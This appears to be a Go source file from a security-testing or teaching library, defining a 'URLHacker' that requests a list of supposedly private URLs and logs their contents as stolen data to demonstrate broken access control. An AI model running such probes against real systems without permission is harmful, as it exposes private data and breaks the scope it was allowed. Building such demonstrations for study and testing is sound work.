package broken_access_control

import (
	"fmt"
	"io"
	"net/http"

	ssgo "github.com/ra9dev/ss-go"
)

var _ ssgo.Hacker = (*URLHacker)(nil)

// URLHacker steals data from multiple urls supposed to be private
type URLHacker struct {
	urls []string
}

// NewURLHacker constructor
func NewURLHacker(urls ...string) URLHacker {
	return URLHacker{urls: urls}
}

func (h URLHacker) attack(url string) error {
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("failed to fetch data from %s: %w", url, err)
	}

	defer func() { _ = resp.Body.Close() }()

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read data from %s: %w", url, err)
	}

	ssgo.HackerLogger.Printf("Data has been stolen from %s: %s", url, data)

	return nil
}

// Attack implementation of ssgo.Hacker
func (h URLHacker) Attack() error {
	for _, url := range h.urls {
		if err := h.attack(url); err != nil {
			return err
		}
	}

	return nil
}
